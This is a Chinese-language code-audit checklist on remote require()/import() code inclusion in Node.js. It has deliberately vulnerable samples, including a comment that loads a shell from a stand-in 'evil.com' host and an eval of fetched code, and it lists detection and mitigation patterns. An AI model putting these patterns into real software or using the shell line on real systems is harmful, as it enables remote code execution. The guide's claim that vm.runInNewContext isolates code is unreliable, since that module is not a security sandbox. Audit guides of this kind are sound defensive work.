# Node.js 远程 require() RFI

## 漏洞成因
Node.js 的 `require()` 或 `import()` 加载用户可控的远程脚本 URL，通过 HTTP 客户端拉取并执行，导致任意代码执行。

---

## Details

### 代码示例

```javascript
// 危险示例 1: 动态 require 远程 URL
const userModule = require(req.query.module);  // require('http://evil.com/shell.js')

// 危险示例 2: 拉取 URL 后执行
const fetch = require('node-fetch');
const url = req.body.script_url;
fetch(url).then(r => r.text()).then(code => eval(code));

// 危险示例 3: 动态 import 远程脚本
const scriptUrl = req.query.url;
import(scriptUrl).then(module => module.execute());

// 危险示例 4: webpack/bundler 动态加载
require.ensure([req.query.component], function(require) {
    const Component = require(req.query.component);
});
```

### 快速定位核心操作 (L2: 跳读)
- **关键函数**：`require()`、`import()`、`eval()`、`vm.runInThisContext()`
- **HTTP 客户端**：`fetch`、`axios`、`request`、`http.get()`
- **数据流**：URL 参数 → HTTP 请求 → 拉取内容 → 执行/require
- **危险模式**：
  - 用户可控 require 路径
  - 拉取 URL 后调用 `eval/Function`
  - 动态导入模块路径

### 快速定位保护机制 (L3: 逐行读)
- **白名单验证**：
  - `const allowed = ['module1', 'module2']; if (allowed.includes(req.query.module))`
  - 预定义的可加载模块列表
- **协议限制**：
  - `if (!url.startsWith('https://')) throw new Error()`
  - `new URL(url).protocol === 'https:'`
- **域名白名单**：
  - `const whitelist = ['trusted-domain.com']; if (new URL(url).hostname !== whitelist[0])`
- **内容验证**：
  - 拉取后检查内容签名或 hash
  - 限制脚本大小和执行时间
- **沙箱执行**：
  - `vm.runInNewContext(code, {})` 隔离执行环境

---

## Classify

### 漏洞
- 用户直接或间接控制 require/import 路径
- 无协议限制或域名白名单
- 拉取内容后直接 eval 或 require 执行
- 跨文件场景：A 模块拉取 URL，B 模块信任并执行

### 误报
- 模块路径完全来自配置文件或数据库（非用户输入）
- 严格白名单验证且不可绕过
- 拉取内容仅作为数据处理（JSON/配置），不执行代码
- `node --disallow-code-generation-from-strings` 启用禁止 eval

### 代码异味
- 模块路径部分可控但有弱验证（如仅检查后缀）
- require 逻辑跨多个文件，难以追踪完整流程
- 环境变量或配置动态影响模块加载路径

---

## Low risk

- **本地模块库**：require 仅加载本地 node_modules 或固定目录，无远程加载
- **严格白名单**：允许的模块列表硬编码且完全覆盖所有合法需求
- **协议 + 域名双重限制**：仅允许 https 且仅限特定信任域名
- **内容签名验证**：拉取内容后验证加密签名，无效则拒绝
- **沙箱隔离**：使用 `vm` 模块或其他隔离机制限制执行权限
- **无外网访问**：应用运行在隔离网络，无法访问外部 URL

---

## 审计重点

1. 追踪 require/import 的参数来源
2. 搜索 eval、Function、vm.runInThisContext 等危险函数
3. 检查 HTTP 库调用后的数据流
4. 验证白名单覆盖率是否完整
5. 测试绕过向量（编码、重定向等）
